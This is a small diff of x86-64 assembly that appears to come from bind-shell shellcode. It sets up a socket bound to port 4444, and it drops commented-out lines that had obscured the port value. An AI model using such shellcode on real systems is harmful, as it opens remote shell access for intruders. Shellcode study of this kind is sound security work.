@@ -38,11 +38,8 @@ _start:
 ; Bind
 	xchg edi,eax ; eax now equals 2, edi equals socket descriptor
 	push rdx
-	;mov ebx,0xa3eefffd ; 0x5c110002 not encoded
-	;not ebx
 	push rax ; already has 2 in it
 	mov word [rsp + 2], 0x5c11 ; port 4444 in network byte order (big endian)
-	;push rbx
 	push rsp
 	pop rsi
 	push rax ; has 2 in it	
